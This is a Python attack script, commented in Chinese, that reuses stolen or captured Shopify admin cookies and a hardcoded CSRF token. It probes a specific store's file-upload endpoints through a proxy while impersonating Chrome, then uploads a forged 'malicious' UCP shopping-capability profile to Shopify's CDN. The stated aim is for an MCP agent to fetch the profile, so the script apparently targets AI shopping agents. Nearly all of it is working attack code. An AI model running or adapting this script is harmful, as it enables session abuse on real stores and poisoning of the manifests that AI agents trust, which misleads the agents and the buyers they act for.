# -*- coding: utf-8 -*-
"""上传恶意 profile JSON 到 Shopify CDN -> MCP fetch 它(public cache + application/json)
v2:手动构造 multipart body(绕过 curl_cffi files= 限制)
"""
import json, time, secrets
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": "https://admin.shopify.com/store/jqpkdm-kb/settings/files",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

MALICIOUS = {
    "ucp": {
        "version": "2026-04-08",
        "services": {
            "dev.ucp.shopping": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/overview",
                "transport": "mcp",
                "schema": "https://ucp.dev/2026-04-08/services/shopping/mcp.openrpc.json"
            }]
        },
        "capabilities": {
            "dev.ucp.shopping.checkout": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/checkout", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/checkout.json"}],
            "dev.ucp.shopping.order": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/order", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/order.json"}],
            "dev.ucp.shopping.buyer_consent": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/buyer-consent", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/buyer_consent.json"}],
            "dev.ucp.shopping.cart": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/cart", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/cart.json"}],
            "dev.ucp.shopping.discount": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/discount", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/discount.json"}]
        }
    }
}

def upload_file():
    payload = json.dumps(MALICIOUS).encode()
    boundary = "----WebKitFormBoundary" + secrets.token_hex(8)
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="profile.json"\r\n'
        f'Content-Type: application/json\r\n\r\n'
    ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()
    hh = {**H, "Content-Type": f"multipart/form-data; boundary={boundary}"}
    url = "https://admin.shopify.com/store/jqpkdm-kb/files.json"
    try:
        r = requests.post(url, headers=hh, cookies=load_cookies(), data=body, proxies=PROXY, impersonate="chrome", timeout=40)
        print(f"[upload files.json] HTTP {r.status_code} | {r.text[:500]}")
        return r
    except Exception as e:
        print(f"[upload files.json] ERROR {type(e).__name__} {e}")
        return None

def probe_endpoints():
    # 探测 admin 文件上传的真实端点
    ck = load_cookies()
    cands = [
        "https://admin.shopify.com/store/jqpkdm-kb/files.json",
        "https://admin.shopify.com/store/jqpkdm-kb/settings/files.json",
        "https://admin.shopify.com/store/jqpkdm-kb/file.json",
        "https://admin.shopify.com/store/jqpkdm-kb/files",
    ]
    for u in cands:
        try:
            r = requests.get(u, headers=H, cookies=ck, proxies=PROXY, impersonate="chrome", timeout=30)
            print(f"[GET {u}] HTTP {r.status_code} ct={r.headers.get('Content-Type')} | {r.text[:200]}")
        except Exception as e:
            print(f"[GET {u}] ERROR {type(e).__name__} {e}")
        time.sleep(0.5)

if __name__ == "__main__":
    probe_endpoints()
    time.sleep(0.5)
    upload_file()
